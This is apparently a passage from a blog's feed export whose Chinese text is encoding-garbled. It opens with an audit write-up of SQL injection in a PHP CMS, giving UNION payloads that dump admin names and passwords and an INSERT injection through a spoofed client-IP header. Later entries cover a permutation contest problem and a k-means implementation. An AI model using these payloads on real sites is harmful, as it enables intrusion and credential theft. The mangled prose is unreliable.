è‹¥é€šè¿‡GETèŽ·å¾—ad_idåˆ™åŽ»é™¤å®ƒä¸¤è¾¹çš„ç©ºç™½å­—ç¬¦ï¼Œå¦åˆ™ä¸ºç©ºã€‚åœ¨èŽ·å¾—äº†ad_idå€¼åŽï¼ŒæŽ¥ä¸‹æ¥å°±ç›´æŽ¥å°†$ad_idé€å…¥äº†æŸ¥è¯¢è¯­å¥ï¼Œæ²¡æœ‰åšä»»ä½•è¿‡æ»¤ï¼Œå› æ­¤è¿™é‡Œå­˜åœ¨æ³¨å…¥ã€‚ åˆ©ç”¨ å…ˆæŸ¥è¯¢åˆ—æ•° /ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6 æŠ¥é”™ ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,7,8 æŠ¥é”™ ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,7 æ— æŠ¥é”™ï¼Œä¸”æŸ¥çœ‹æºä»£ç å‘çŽ°æ•°å­—7æœ‰å›žæ˜¾ã€‚ æå–æ•°æ®åˆ©ç”¨å…ƒæ•°æ®è¡¨çˆ†å‡ºè¡¨å1ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database() çˆ†å‡ºå­—æ®µ ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e èŽ·å–ç”¨æˆ·åå¯†ç  ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin æ³¨å…¥äºŒå®¡è®¡å‡½æ•°å®šä½ï¼š12345678910111213141516171819202122232425262728function getip()&#123; if (getenv('HTTP_CLIENT_IP')) &#123; $ip = getenv('HTTP_CLIENT_IP'); &#125; elseif (getenv('HTTP_X_FORWARDED_FOR')) &#123; //????????????????????????????ip ??? $ip = getenv('HTTP_X_FORWARDED_FOR'); &#125; elseif (getenv('HTTP_X_FORWARDED')) &#123; $ip = getenv('HTTP_X_FORWARDED'); &#125; elseif (getenv('HTTP_FORWARDED_FOR')) &#123; $ip = getenv('HTTP_FORWARDED_FOR'); &#125; elseif (getenv('HTTP_FORWARDED')) &#123; $ip = getenv('HTTP_FORWARDED'); &#125; else &#123; $ip = $_SERVER['REMOTE_ADDR']; &#125; return $ip;&#125; ç›´æŽ¥èŽ·å–äº†ipï¼Œå¹¶æ²¡æœ‰éªŒè¯IPæ ¼å¼ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¼ªé€ ipã€‚æŸ¥çœ‹ä¸€ä¸‹æœ‰å“ªäº›ä½ç½®è°ƒç”¨äº† getip() ï¼Œ comment.phpé¡µé¢å…¶ä¸­æœ‰å¦‚ä¸‹ä»£ç  $sql = &quot;INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;&quot;.getip().&quot;&#39;, &#39;$is_check&#39;)&quot;; $db-&gt;query($sql); å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæ‰§è¡Œäº†INSERTè¯­å¥ï¼Œä¸”è°ƒç”¨äº†getip()ï¼Œè¿™é‡Œå­˜åœ¨æ³¨å…¥ã€‚ åˆ©ç”¨è¿™æ˜¯ç›®å‰çš„ç•™è¨€æ¿ï¼š åœ¨burpæˆªåŒ…åŽï¼Œpostå‚æ•°å¦‚ä¸‹ï¼šæ‰€ä»¥ user_id=2 id=6 å³ post_id=6 å¯¹åº”å‘è¡¨ç•™è¨€çš„æ–‡ç« id type=1 mood=6 ï¼ˆè¿™ä¸ªæ— å…³ç´§è¦ï¼‰ ä¸ºäº†èƒ½è®©æŠŠç®¡ç†å‘˜è´¦å·å’Œå¯†ç å›žæ˜¾å‡ºæ¥ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æŽ¥åœ¨getip()çš„ä½ç½®ä¸Šç›´æŽ¥åŽ»æŸ¥è¯¢ã€‚åœ¨å‰é¢çš„sqlè¯­å¥ä¸­ï¼Œcontentå˜é‡æ˜¯ä¼šå›žæ˜¾åˆ°é¡µé¢ä¸Šçš„ï¼Œè¿™é‡Œåˆ©ç”¨è¿™ä¸ªä½ç½®åŽ»æž„é€ payloadã€‚ payloadå¦‚ä¸‹ï¼š 1&#39;,&#39;1&#39;),(&#39;&#39;,&#39;6&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(admin_name,&#39;:&#39;,pwd) from blue_admin),&#39;1&#39;,&#39;1 payloadåˆ†æžï¼š1â€™,â€™1â€™)æ˜¯ä¸ºäº†å®Œæˆç¬¬ä¸€æ¬¡æ’å…¥ï¼Œä¹‹åŽçš„ï¼ˆï¼‰æ˜¯ä¸ºäº†å®Œæˆç¬¬äºŒæ¬¡æ’å…¥ï¼Œå‰é¢çš„ â€˜â€™,â€™6â€™,â€™2â€™,â€™1â€™,â€™6â€™ æ˜¯ä¸Žç¬¬ä¸€ä¸ªæ’å…¥è¯­å¥çš„å‚æ•°ç›¸å¯¹åº”ã€‚æŽ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æŠŠæŸ¥è¯¢åˆ°çš„è´¦å·å¯†ç æ”¾åœ¨äº†ç¬¬å…­ä¸ªå‚æ•°å³contentä½ç½®ï¼Œè¿™æ ·èƒ½å®žçŽ°å›žæ˜¾ã€‚è€Œæœ€åŽçš„ â€˜1â€™,â€™1 æ˜¯è¦æ»¡è¶³åˆ—æ•°ç›¸ç­‰å¦åˆ™ä¼šå‡ºé”™ï¼ŒåŒæ—¶è¦æ³¨æ„é—­åˆåŽŸæœ¬è¯­å¥ä¸­çš„å•å¼•å·ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ª 1 å¯¹åº”sqlè¯­å¥ä¸­çš„$timestampï¼Œè¡¨ç¤ºå‘è¡¨æ—¶é—´ï¼Œè¿™ä¸ªæ— å…³ç´§è¦ã€‚ æ‰€ä»¥è¿™æ ·æ’å…¥åŽå®Œæ•´çš„sqlè¯­å¥æ˜¯ï¼š $sql = INSERT INTO &quot;.table(&#39;comment&#39;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#39;&#39;, &#39;$id&#39;, &#39;$user_id&#39;, &#39;$type&#39;, &#39;$mood&#39;, &#39;$content&#39;, &#39;$timestamp&#39;, &#39;1&#39;,&#39;1&#39;),(&#39;&#39;,&#39;6&#39;,&#39;2&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(admin_name,&#39;:&#39;,pwd) from blue_admin),&#39;1&#39;,&#39;1&#39;, &#39;$is_check&#39;)&quot;; ForwardåŽ æ³¨å…¥æˆåŠŸã€‚]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ACMXMU-OJ:1005]]></title>
      <url>%2F2017%2F03%2F09%2FACMXMU-OJ-1005%2F</url>
      <content type="text"><![CDATA[é¢˜ç›® 1005.Complete PermutationDescriptionGenerate the complete permutation of 1..N InputEach input file contains only one non-negative integer N (0&lt; N &lt; 9) OutputOutput N! Lines, according to lexicographic order. Sample Input3 Sample Output1 2 3 1 3 2 2 1 3 2 3 1 3 1 2 3 2 1 æƒ³æ³•ä¸€å¼€å§‹æƒ³åˆ°ç”¨é€’å½’æ¥å†™å…¨æŽ’åˆ—ï¼Œå°±è¯¾æœ¬ä¸Šçš„æ–¹æ³•ï¼Œç»“æžœæ‰å‘çŽ°è¾“å‡ºæ—¶æœ€åŽä¸¤ä¸ªçš„æ¬¡åºä¸å¯¹ã€‚å…ˆè¯•äº†è¯•STLä¸­çš„next_permutationå‡½æ•°ï¼ŒåŽé¢åˆè‡ªå·±å†™äº†ä¸ªå­—å…¸åºæ³•å…¨æŽ’åˆ—ã€‚è¿™é‡Œç®€è¿°ä¸€ä¸‹å­—å…¸åºæ³•å…¨æŽ’åˆ— å¾…æŽ’åˆ—â€œå­—ç¬¦ä¸²â€ï¼š P_0P_1P_2..P_{j-1}P_jP_{j+1}..P_n ä»ŽåŽå¾€å‰æœç´¢ï¼Œç›´åˆ°æ‰¾åˆ°è¿™æ ·çš„ä¸€ä¸ªæ•°ï¼Œå®ƒçš„ä¸‹æ ‡ä¸º jï¼Œä¸”æ»¡è¶³ P_{j} < P_{j+1}ã€‚æ­¤æ—¶æœ‰ï¼šP_{j} < P_{j+1} > P_{j+2} > P_{j+3} > .... > P_{n}å³ä»ŽP{j+1} åˆ° P{n}ï¼Œå®ƒä»¬æ˜¯æŒ‰å­—å…¸åºé€’å‡çš„ã€‚ å†æ¬¡ä»ŽåŽå‘å‰æœç´¢ï¼Œç›´åˆ°æ‰¾åˆ°è¿™æ ·çš„ä¸€ä¸ªæ•°ï¼Œå®ƒçš„ä¸‹æ ‡ä¸º kï¼Œä¸”æ»¡è¶³ P_{k} > P_{j}ã€‚P_kçš„ä½ç½®å¦‚ä¸‹ï¼šP_0P_1P_2..P_{j-1}P_jP_{j+1}....P_{k-1}P_{k}P_{k+1}....P_n äº¤æ¢P_{k}å’ŒP_{j}çš„å€¼ï¼Œè¿™æ—¶å€™â€œå­—ç¬¦ä¸²â€ä¸ºï¼šP_0P_1P_2..P_{j-1}P_kP_{j+1}....P_{k-1}P_{j}P_{k+1}....P_nè¿™æ—¶å€™å¾—åˆ°çš„â€œå­—ç¬¦ä¸²â€ä¼šæ¯”åŽŸæœ¬çš„â€œå­—ç¬¦ä¸²â€å¤§,ä½†å¹¶ä¸æ˜¯æ‰€æœ‰å¤§äºŽâ€œåŽŸå­—ç¬¦ä¸²â€ä¸­æœ€å°çš„ã€‚ ç»“åˆç”±ï¼ˆ2ï¼‰å¾—åˆ°çš„å¤§å°å…³ç³»,ä»¥åŠ P_{k} > P_{j}ï¼Œå¯ä»¥å¾—åˆ°äº¤æ¢åŽçš„â€œå­—ç¬¦ä¸²â€å¤§å°å…³ç³»å¦‚ä¸‹:....P_kP_{j+2}>....>P_{k-1}>P_{j}>P_{k+1}....>P_næ‰€ä»¥åœ¨æœ€åŽä¸€æ­¥ä¸­ï¼ŒæŠŠ P{j+1}P{j+2}â€¦.P_{n} åè½¬è¿‡æ¥ã€‚æœ€åŽå¾—åˆ°ï¼šP_0P_1P_2..P_{j-1}P_kP_{n}..P_{j}..P_{j+1}P_{j+2}P_{j+1}....P_nè¿™æ ·å¾—åˆ°çš„æ–°â€œå­—ç¬¦ä¸²â€æ˜¯å¤§äºŽâ€œåŽŸå­—ç¬¦ä¸²â€ä¸­æœ€å°çš„ã€‚ æäº¤å­—å…¸åºæ³•å…¨æŽ’åˆ—å…ˆè´´ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;stdio.h&gt;using namespace std;int arrays[10];int main()&#123; int number; int q; scanf("%d",&amp;number); for(q = 1;q &lt;= number;q++) arrays[q] = q; while(true)&#123; int j,k; int q; for(q = 1;q &lt; number;q++) printf("%d ",arrays[q]); printf("%d\n",arrays[number]); for(j = number;j &gt; 0;j--) if(arrays[j] &lt; arrays[j+1]) break; if(j == 0) break; for(k = number;k &gt; j;k--) if(arrays[k] &gt; arrays[j]) break; int temp; temp = arrays[j]; arrays[j] = arrays[k]; arrays[k] = temp; int i1,i2; for(i1 = j+1,i2 = number;i1 &lt; i2;i1++,i2--) &#123; int temp; temp = arrays[i1]; arrays[i1] = arrays[i2]; arrays[i2] = temp; &#125; &#125; return 0;&#125; ä½¿ç”¨STL123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;stdio.h&gt;using namespace std;int main()&#123; int number; scanf("%d",&amp;number); int a[11]; int i; for(i = 0;i &lt; number;i++) a[i] = i + 1; do&#123; int k; for(k = 0;k &lt; number - 1;k++) printf("%d ",a[k]); printf("%d\n",a[number - 1]); &#125; while (next_permutation(a,a+number)); return 0;&#125; é€’å½’å…¨æŽ’åˆ—ï¼Œä¸åˆè¦æ±‚123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;stdio.h&gt;using namespace std;int number;char arrays[11]="0123456789";void Perm(int m);int main()&#123; scanf("%d",&amp;number); int i,j; Perm(1); return 0;&#125;void Perm(int m)&#123; if (m == number)&#123; int i; for(i = 1;i &lt; m;i++) printf("%c ",arrays[i]); printf("%c\n",arrays[m]); &#125; else &#123; int i,j; for(j = m;j &lt;= number;j++)&#123; int temp; temp = arrays[j]; arrays[j] = arrays[m]; arrays[m] = temp; Perm(m+1); temp = arrays[j]; arrays[j] = arrays[m]; arrays[m] = temp; &#125; &#125;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[æœºå™¨å­¦ä¹ ç®—æ³•ï¼šk-means]]></title>
      <url>%2F2017%2F03%2F08%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9Ak-means%2F</url>
      <content type="text"><![CDATA[K-meansç®—æ³•å­¦ä¹  æ¡ä»¶å¾…åˆ†ç±»çš„ç‰¹å¾çŸ¢é‡é›†ä¸º {x_1,x_2,x_3,â€¦â€¦x_N}ç±»åˆ«çš„æ•°ç›®å·²çŸ¥ï¼šc åŸºæœ¬æƒ³æ³•å–å®š k ä¸ªç±»åˆ«ï¼Œé€‰å– k ä¸ªåˆå§‹èšç±»ä¸­å¿ƒï¼ŒæŒ‰æœ€å°è·ç¦»åŽŸåˆ™å°†å„æ¨¡å¼åˆ†é…åˆ° kç±» ä¸­çš„æŸä¸€ç±»ï¼Œä¹‹åŽä¸æ–­çš„è®¡ç®—ç±»å¿ƒå’Œè°ƒæ•´å„æ¨¡å¼çš„ç±»åˆ«ï¼Œæœ€ç»ˆä½¿å¾—å„æ¨¡å¼åˆ°å…¶åˆ¤å±žç±»åˆ«çš„è·ç¦»å¹³æ–¹ä¹‹å’Œæœ€å°ã€‚ ç®—æ³•æ­¥éª¤ é€‰æ‹©kä¸ªæ¨¡å¼ç‰¹å¾çŸ¢é‡ä½œä¸ºåˆå§‹èšç±»ä¸­å¿ƒï¼š{$ z{_1}{^{(0)}},z{_2}{^{(0)}}, z{_3}{^{(0)}} ,â€¦â€¦ ,z{_k}{^{(0)}}$}ã€‚ä»¤ q = 0ã€‚ å°†å¾…åˆ†ç±»çš„æ¨¡å¼ç‰¹å¾çŸ¢é‡é›†{x_i}ä¸­çš„æ¨¡å¼é€ä¸ªæŒ‰æœ€å°è·ç¦»åŽŸåˆ™åˆ†åˆ’ç»™ kç±»ä¸­çš„æŸä¸€ç±»ï¼Œå³ï¼šå¦‚æžœ d_{il}^{(q)} = {\mathop{min}\limits_{ij}}[d_{ij}^{(q)}]åˆ™åˆ¤å®š x_i âˆˆ Ï‰_l^{q+l}å¼ä¸­ï¼Œd_{il}^{(q)}è¡¨ç¤º x_i å’Œ Ï‰_j^{q}çš„ä¸­å¿ƒ z_j^{(j)}ã€‚ä¸Šè§’æ ‡ä¸ºè¿­ä»£æ¬¡æ•°ï¼ŒäºŽæ˜¯äº§ç”Ÿäº†æ–°çš„èšç±» Ï‰_j^{(q+1)} (j=1,2,3,â€¦â€¦,k) è®¡ç®—é‡æ–°åˆ†ç±»åŽçš„å„ç±»å¿ƒz_j^{q+1} =\frac{1}{n_j^{q+1}}\sum_{x_i âˆˆ \omega_j^{q+1}} x_i\tag{j = 1,2,3,â€¦â€¦,k} å¼ä¸­ï¼š$n_j^{k+1}$ ä¸º $\omega_j^(k+1)$ ç±»ä¸­æ‰€å«æ¨¡å¼çš„ä¸ªæ•° å¦‚æžœ $ z_j^{q+1}=z_j^{q} $ ï¼Œåˆ™ç»“æŸï¼Œå¦åˆ™è¿”å›žï¼ˆ2ï¼‰ ç®—æ³•å®žçŽ°12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import numpy as npimport pandas as pdimport copy as cpdef readData(filepath): file = pd.read_table(filepath,header=None,sep=' ') return file# è®¡ç®—æ¬§å‡ é‡Œå¾—è·ç¦»def distance(vec1,vec2): return np.sqrt(sum(np.power((vec1-vec2).tolist(),2)))# è®¡ç®—ç‰¹å¾Xä¸Žå„è´¨å¿ƒçš„è·ç¦»ï¼ŒæŒ‰æœ€å°è·ç¦»åŽŸåˆ™æ‰¾åˆ°ç‚¹Xå¯¹åº”çš„ç±»,æ­¤å¤„è·ç¦»ä¸ºæ¬§å¼è·ç¦»def findClass(dataSetloc,centerSet): disitoZ = [] for j in range(len(centerSet)): disitoZ.append(float(distance(dataSetloc,centerSet[j]))) print(disitoZ) return(disitoZ.index(min(disitoZ)))# ç”¨äºŽè®¡ç®—è°ƒæ•´åŽå„ç±»çš„ä¸­å¿ƒdef adjustCenter(centerSet,classNumber): tempCenter=[] for i in range(classNumber): tempCenter.append([0,0,0]) for i in range(classNumber): patternNum = len(centerSet[i]) # è®¡ç®—æ–°çš„è´¨å¿ƒ for nowX in centerSet[i]: tempCenter[i][0] += nowX[0] tempCenter[i][1] += nowX[1] tempCenter[i][2] += nowX[2] for j in range(3): tempCenter[i][j] = tempCenter[i][j] / patternNum return tempCenterdef isequal(class1,class2): return (class1[0]==class2[0] and class1[1]==class2[1])pdDataSet = readData('dataset.txt')# é¢˜ç›®æ‰€ç»™åˆå§‹æ¡ä»¶sk = int(input("è¾“å…¥ç±»åˆ«æ•°ç›®:\n"))center = []classSet = []classLabel = []for i in range(k): print("è¯·è¾“å…¥ç¬¬",i+1,"ä¸ªåˆå§‹ä¸­å¿ƒï¼š") templist = list(input().split(',')) templist = [float(num) for num in templist] center.append(templist) classSet.append([]) classLabel.append([])print('åˆå§‹ä¸­å¿ƒå¦‚ä¸‹ï¼š')print(center)# ç”¨äºŽåˆ¤æ–­ç»“æŸæ¡ä»¶judgeValue = 1# ç”¨äºŽè®°å½•è¿­ä»£æ¬¡æ•°global iterationsiterations = 0while judgeValue : # centerCopyä¿å­˜centerçš„åˆå§‹å€¼ï¼Œç”¨äºŽç»“æŸåˆ¤æ–­ print("----------------------------------------") iterations += 1 classLabelCopy = cp.deepcopy(classLabel) print("ç¬¬",iterations,"æ¬¡å¾ªçŽ¯") classSet = [[],[],[]] classLabel = [[],[],[]] print("--------è®¡ç®—æ¯ä¸ªç‚¹åˆ°å„ç±»ä¸­å¿ƒçš„è·ç¦»--------") for i in range(len(pdDataSet)): Xindex = findClass(pdDataSet.loc[i],center) classSet[Xindex].append(pdDataSet.loc[i].tolist()) classLabel[Xindex].append(i) print("----------å½“å‰å„ç±»ä¸­å¿ƒä½ç½®----------") center = adjustCenter(classSet,k) for i in range(k): print("ç¬¬",i+1,"ç±»ä¸­å¿ƒä½ç½®ä¸º",center[i]) print("----------å½“å‰åˆ†ç±»ç»“æžœ(æ•°æ®)----------") print(classSet) print("----------å½“å‰åˆ†ç±»ç»“æžœï¼ˆå¯¹åº”ç´¢å¼•ï¼‰----------") print(classLabel) # è‹¥ç±»åˆ«ä¸­çš„ç‚¹ä¸å†å˜åŒ–ï¼Œåˆ™é€€å‡ºå¾ªçŽ¯ if isequal(classLabel,classLabelCopy): judgeValue = 0 dataset.txtå†…å®¹ï¼š1234567891011121314151617181920-7.82 -4.58 -3.97-6.68 3.16 2.714.36 -2.19 2.096.72 0.88 2.80-8.64 3.06 3.50-6.87 0.57 -5.454.47 -2.62 5.766.73 -2.01 4.18-7.71 2.34 -6.33-6.91 -0.49 -5.686.18 2.81 5.826.72 -0.93 -4.04-6.25 -0.26 0.56-6.94 -1.22 1.138.09 0.20 2.256.81 0.17 -4.15-5.19 4.24 4.04-6.38 -1.74 1.434.08 1.30 5.36.27 0.93 -2.78 è¿ç®—ç»“æžœ é¢˜ç›®ä¸€ï¼šk = 2, m_{1}(0) = {(1,1,1)}^T,m_{2}(0)={(-1,1,-1)}^T 12345678910111213141516171819202122232425262728293031323334è¾“å…¥ç±»åˆ«æ•°ç›®:2è¯·è¾“å…¥ç¬¬ 1 ä¸ªåˆå§‹ä¸­å¿ƒï¼š1,1,1è¯·è¾“å…¥ç¬¬ 2 ä¸ªåˆå§‹ä¸­å¿ƒï¼š-1,1,-1åˆå§‹ä¸­å¿ƒå¦‚ä¸‹ï¼š[[1.0, 1.0, 1.0], [-1.0, 1.0, -1.0]]----------------------------------------ç¬¬ 1 æ¬¡å¾ªçŽ¯--------è®¡ç®—æ¯ä¸ªç‚¹åˆ°å„ç±»ä¸­å¿ƒçš„è·ç¦»--------[11.559831313648138, 9.298908538102738][8.159172752185112, 7.119838481314025]ï¼ˆæ­¤å¤„çœç•¥ï¼‰----------å½“å‰å„ç±»ä¸­å¿ƒä½ç½®----------ç¬¬ 1 ç±»ä¸­å¿ƒä½ç½®ä¸º [6.042999999999999, -0.14599999999999996, 1.7229999999999996]ç¬¬ 2 ç±»ä¸­å¿ƒä½ç½®ä¸º [-6.938999999999998, 0.508, -0.8060000000000003]----------å½“å‰åˆ†ç±»ç»“æžœ(æ•°æ®)----------[[[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-7.82, -4.58, -3.97], [-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43]]]----------å½“å‰åˆ†ç±»ç»“æžœï¼ˆå¯¹åº”ç´¢å¼•ï¼‰----------[[2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [0, 1, 4, 5, 8, 9, 12, 13, 16, 17]]----------------------------------------ç¬¬ 2 æ¬¡å¾ªçŽ¯--------è®¡ç®—æ¯ä¸ªç‚¹åˆ°å„ç±»ä¸­å¿ƒçš„è·ç¦»--------[15.6286075515383, 6.055972341416364][13.18250863834346, 4.411625664083479]ï¼ˆæ­¤å¤„çœç•¥ï¼‰----------å½“å‰å„ç±»ä¸­å¿ƒä½ç½®----------ç¬¬ 1 ç±»ä¸­å¿ƒä½ç½®ä¸º [6.042999999999999, -0.14599999999999996, 1.7229999999999996]ç¬¬ 2 ç±»ä¸­å¿ƒä½ç½®ä¸º [-6.938999999999998, 0.508, -0.8060000000000003]----------å½“å‰åˆ†ç±»ç»“æžœ(æ•°æ®)----------[[[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]], [[-7.82, -4.58, -3.97], [-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43]]]----------å½“å‰åˆ†ç±»ç»“æžœï¼ˆå¯¹åº”ç´¢å¼•ï¼‰----------[[2, 3, 6, 7, 10, 11, 14, 15, 18, 19], [0, 1, 4, 5, 8, 9, 12, 13, 16, 17]] é¢˜ç›®äºŒï¼šk = 2, m_{1}(0) = {(0,0,0)}^T,m_{2}(0)={(1,1,-1)}^T 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647è¾“å…¥ç±»åˆ«æ•°ç›®:2è¯·è¾“å…¥ç¬¬ 1 ä¸ªåˆå§‹ä¸­å¿ƒï¼š0,0,0è¯·è¾“å…¥ç¬¬ 2 ä¸ªåˆå§‹ä¸­å¿ƒï¼š1,1,-1åˆå§‹ä¸­å¿ƒå¦‚ä¸‹ï¼š[[0.0, 0.0, 0.0], [1.0, 1.0, -1.0]]----------------------------------------ç¬¬ 1 æ¬¡å¾ªçŽ¯--------è®¡ç®—æ¯ä¸ªç‚¹åˆ°å„ç±»ä¸­å¿ƒçš„è·ç¦»--------[9.893922376893808, 10.85125338382622][7.870965633262542, 8.798414629920552](æ­¤å¤„çœç•¥)----------å½“å‰å„ç±»ä¸­å¿ƒä½ç½®----------ç¬¬ 1 ç±»ä¸­å¿ƒä½ç½®ä¸º [-3.5535714285714293, -0.03142857142857136, 0.6621428571428571]ç¬¬ 2 ç±»ä¸­å¿ƒä½ç½®ä¸º [6.798333333333332, 0.6766666666666666, -0.016666666666666535]----------å½“å‰åˆ†ç±»ç»“æžœ(æ•°æ®)----------[[[-7.82, -4.58, -3.97], [-6.68, 3.16, 2.71], [4.36, -2.19, 2.09], [-8.64, 3.06, 3.5], [-6.87, 0.57, -5.45], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43], [4.08, 1.3, 5.3]], [[6.72, 0.88, 2.8], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [6.27, 0.93, -2.78]]]----------å½“å‰åˆ†ç±»ç»“æžœï¼ˆå¯¹åº”ç´¢å¼•ï¼‰----------[[0, 1, 2, 4, 5, 6, 7, 8, 9, 12, 13, 16, 17, 18], [3, 10, 11, 14, 15, 19]]----------------------------------------ç¬¬ 2 æ¬¡å¾ªçŽ¯--------è®¡ç®—æ¯ä¸ªç‚¹åˆ°å„ç±»ä¸­å¿ƒçš„è·ç¦»--------[7.76844014232574, 16.029880172145184][4.914620109054872, 13.973801379724845](æ­¤å¤„çœç•¥)----------å½“å‰å„ç±»ä¸­å¿ƒä½ç½®----------ç¬¬ 1 ç±»ä¸­å¿ƒä½ç½®ä¸º [-6.938999999999998, 0.508, -0.8060000000000003]ç¬¬ 2 ç±»ä¸­å¿ƒä½ç½®ä¸º [6.042999999999999, -0.14599999999999996, 1.7229999999999996]----------å½“å‰åˆ†ç±»ç»“æžœ(æ•°æ®)----------[[[-7.82, -4.58, -3.97], [-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]]]----------å½“å‰åˆ†ç±»ç»“æžœï¼ˆå¯¹åº”ç´¢å¼•ï¼‰----------[[0, 1, 4, 5, 8, 9, 12, 13, 16, 17], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19]]----------------------------------------ç¬¬ 3 æ¬¡å¾ªçŽ¯--------è®¡ç®—æ¯ä¸ªç‚¹åˆ°å„ç±»ä¸­å¿ƒçš„è·ç¦»--------[6.055972341416364, 15.6286075515383][4.411625664083479, 13.18250863834346](æ­¤å¤„çœç•¥)----------å½“å‰å„ç±»ä¸­å¿ƒä½ç½®----------ç¬¬ 1 ç±»ä¸­å¿ƒä½ç½®ä¸º [-6.938999999999998, 0.508, -0.8060000000000003]ç¬¬ 2 ç±»ä¸­å¿ƒä½ç½®ä¸º [6.042999999999999, -0.14599999999999996, 1.7229999999999996]----------å½“å‰åˆ†ç±»ç»“æžœ(æ•°æ®)----------[[[-7.82, -4.58, -3.97], [-6.68, 3.16, 2.71], [-8.64, 3.06, 3.5], [-6.87, 0.57, -5.45], [-7.71, 2.34, -6.33], [-6.91, -0.49, -5.68], [-6.25, -0.26, 0.56], [-6.94, -1.22, 1.13], [-5.19, 4.24, 4.04], [-6.38, -1.74, 1.43]], [[4.36, -2.19, 2.09], [6.72, 0.88, 2.8], [4.47, -2.62, 5.76], [6.73, -2.01, 4.18], [6.18, 2.81, 5.82], [6.72, -0.93, -4.04], [8.09, 0.2, 2.25], [6.81, 0.17, -4.15], [4.08, 1.3, 5.3], [6.27, 0.93, -2.78]]]----------å½“å‰åˆ†ç±»ç»“æžœï¼ˆå¯¹åº”ç´¢å¼•ï¼‰----------[[0, 1, 4, 5, 8, 9, 12, 13, 16, 17], [2, 3, 6, 7, 10, 11, 14, 15, 18, 19]] é¢˜ç›®ä¸‰ï¼šk = 3, m_{1}(0) = {(0,0,0)}^T,m_{2}(0)={(1,1,1)}^Tï¼Œm_{3}(0)={(-1,0,2)}^T 1234567891011121314151617181920212223242526272829303132333435363738è¾“å…¥ç±»åˆ«æ•°ç›®:3è¯·è¾“å…¥ç¬¬ 1 ä¸ªåˆå§‹ä¸­å¿ƒï¼š0,0,0è¯·è¾“å…¥ç¬¬ 2 ä¸ªåˆå§‹ä¸­å¿ƒï¼š1,1,1è¯·è¾“å…¥ç¬¬ 3 ä¸ªåˆå§‹ä¸­å¿ƒï¼š-1,0,2åˆå§‹ä¸­å¿ƒå¦‚ä¸‹ï¼š[[0.0, 0.0, 0.0], [1.0, 1.0, 1.0], [-1.0, 0.0, 2.0]]----------------------------------------ç¬¬ 1 æ¬¡å¾ªçŽ¯--------è®¡ç®—æ¯ä¸ªç‚¹åˆ°å„ç±»ä¸­å¿ƒçš„è·ç¦»--------[9.893922376893808, 11.559831313648138, 10.155279415161358][7.870965633262542, 